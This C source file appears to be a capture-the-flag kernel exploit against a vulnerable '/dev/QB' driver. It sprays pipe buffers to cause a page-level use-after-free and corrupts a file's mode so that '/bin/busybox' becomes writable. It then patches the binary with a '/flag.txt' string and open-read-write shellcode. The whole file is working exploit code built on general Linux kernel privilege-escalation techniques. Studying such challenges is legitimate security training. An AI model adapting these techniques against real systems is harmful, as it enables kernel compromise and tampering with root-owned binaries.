#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define DEVICE_PATH "/dev/QB"

#define CONTRACT_SIGN   0x16C0  
#define PURE_SOUL_GEM   0x16C1 
#define ATTACK          0x16C2

struct contract {
    char name[0x10];
    char wish[0x30];
};

struct pure_size {
    int size;
};

struct attack_t {
    unsigned int Dance_of_Magic_Bullets;
    unsigned int Infinite_Magical_Aria; 
    unsigned int Tiro_Finale;
    unsigned int Bombardamento;
    unsigned int Legare_Vasta_Area;
};

int fd;

int sign_contract(void) {
    struct contract c;
    memset(&c, 0, sizeof(c));

    strncpy(c.name, "aaa", sizeof(c.name) - 1);
    strncpy(c.wish, "aaa", sizeof(c.wish) - 1);

    if (ioctl(fd, CONTRACT_SIGN, &c) < 0) {
        fprintf(stderr, "ioctl(CONTRACT_SIGN) failed: %s\n", strerror(errno));
        return -1;
    }
    return 0;
}

int pure_soul_gem(int size) {
    struct pure_size p;
    p.size = size;

    if (ioctl(fd, PURE_SOUL_GEM, &p) < 0) {
        fprintf(stderr, "ioctl(PURE_SOUL_GEM) failed: %s\n", strerror(errno));
        return -1;
    }
    return 0;
}

int attack_witch(void) {
    struct attack_t attack_arg = {
        .Dance_of_Magic_Bullets = 5,
        .Infinite_Magical_Aria = 7, 
        .Tiro_Finale = 8,
        .Bombardamento = 1,
        .Legare_Vasta_Area = 4,
    };

    if (ioctl(fd, ATTACK, &attack_arg) < 0) {
        fprintf(stderr, "ioctl(ATTACK) failed: %s\n", strerror(errno));
        return -1;
    }
    return 0;
}

#define NUM_PIPE_SPRAY 0x40
#define NUM_PIPE_SPRAY_HALF 0x20
#define NUM_FILE_SPRAY 0x50

int main(void) {
    int fd_pipe[NUM_PIPE_SPRAY][2];
    
    fd = open(DEVICE_PATH, O_RDWR);

    if (fd < 0) {
        perror("Error open /dev/QB");
        return -1;
    }

    for (int i = 0; i < NUM_PIPE_SPRAY_HALF; i++){
        int ret = pipe(fd_pipe[i]);
        if (ret == -1) {
            puts("[x] spray pipe part 1 failed");
            exit(0);
        }

    unsigned short val = 0xaabb + i;
        int ret1 = write(fd_pipe[i][1], &val, sizeof(val));
        int ret2 = write(fd_pipe[i][1], "23", 2);
        if (ret1 == -1 || ret2 == -1) {
            puts("[x] error to write data");
            exit(0);
        }

    }

    sign_contract();

    for (int i = NUM_PIPE_SPRAY_HALF; i < NUM_PIPE_SPRAY; i++){
        int ret = pipe(fd_pipe[i]);
        if (ret == -1) {
            puts("[x] spray pipe part 2 failed");
            exit(0);
        }

        unsigned short val = 0xaabb + i;
        int ret1 = write(fd_pipe[i][1], &val, sizeof(val));
        int ret2 = write(fd_pipe[i][1], "23", 2);
        if (ret1 == -1 || ret2 == -1) {
            puts("[x] error to write data");
            exit(0);
        }

    }

    puts("[!] Success prepare victim obj and pipe buffer");

    attack_witch();
    pure_soul_gem(0x400);

    int origin_pipe_fd, overlapping_pipe_fd;
    int find = 0;

    for (int i = 0; i < NUM_PIPE_SPRAY; i++) {
        unsigned short val = 0;
        int ret = read(fd_pipe[i][0], &val, 2);
        if (ret == -1) {
            puts("[x] Error to read data from pipe");
            exit(0);
        }

        if (val != 0xaabb + i) {
            overlapping_pipe_fd = i;
            origin_pipe_fd = val - 0xaabb;
            puts("[!] Detect UAF!");
            printf("[!] UAF happend on %d\n", overlapping_pipe_fd);
            printf("[!] page origin from %d\n", origin_pipe_fd);
            find = 1;
        }
    }

    if (find == 0) {
        puts("[x] Error to make UAF");
        exit(0);
    }

    puts("[!] Free origin fd make page level UAF");
    close(fd_pipe[origin_pipe_fd][0]);
    close(fd_pipe[origin_pipe_fd][1]);

    printf("[!] Try to spray file\n");

    int file_fd[NUM_FILE_SPRAY];
    for (int i = 0; i < NUM_FILE_SPRAY; i++) {
        file_fd[i] = open("/bin/busybox", O_RDONLY);
        if (file_fd < 0) {
            printf("[x] Spray file error\n");
        }
    }

    printf("[!] change file to writable\n");
    int fake_f_mode = 0x84f801f;
    write(fd_pipe[overlapping_pipe_fd][1], &fake_f_mode, 4);

    printf("[!] Try to write /bin/busybox\n");

    int vuln_fd = -1;

    // 0x634C98 busybox rodata - 0x400000

    for (int i = 0; i < NUM_FILE_SPRAY; i++) {
        lseek(file_fd[i], 0x234c98, SEEK_SET);
        int ret = write(file_fd[i], "/flag.txt\0", 10);
        if (ret != -1) {
            printf("[!] Success to overwrite file %d\n",i);
            vuln_fd = i;
        }
    }

    if (vuln_fd == -1) {
        printf("[x] Not success to change file writable\n");
    }

    // 0x48BF90 -> 0x8bf90
    lseek(file_fd[vuln_fd], 0x8bf90, SEEK_SET);
    write(file_fd[vuln_fd], "\x49\xC7\xC0\xBE\x14\x52\x00\x41\xFF\xD0", 10);

    /*
    mov rax, 0x101
    mov rdi, 0xffffffffffffff9c
    mov rsi, 0x634C98
    xor rdx, rdx
    xor r10, r10
    syscall
    mov rdi, rax
    mov rsi, 0x65ac00
    mov rdx, 0x400
    mov rax, 0x0
    syscall
    mov rdx, rax
    mov rsi, 0x65ac00
    mov rdi, 0x1
    mov rax, 0x1
    syscall
    xor rdi, rdi
    mov rax, 0x3c
    syscall
    */

    // 0x5214BE  -> 0x1214be
    unsigned char orw_shellcode[] = "\x48\xC7\xC0\x01\x01\x00\x00\x48\xC7\xC7\x9C\xFF\xFF\xFF\x48\xC7\xC6\x98\x4C\x63\x00\x48\x31\xD2\x4D\x31\xD2\x0F\x05\x48\x89\xC7\x48\xC7\xC6\x00\xAC\x65\x00\x48\xC7\xC2\x00\x04\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x48\x89\xC2\x48\xC7\xC6\x00\xAC\x65\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05\x48\x31\xFF\x48\xC7\xC0\x3C\x00\x00\x00\x0F\x05";
    lseek(file_fd[vuln_fd], 0x1214be, SEEK_SET);
    write(file_fd[vuln_fd], &orw_shellcode, sizeof(orw_shellcode));


    return 0;
}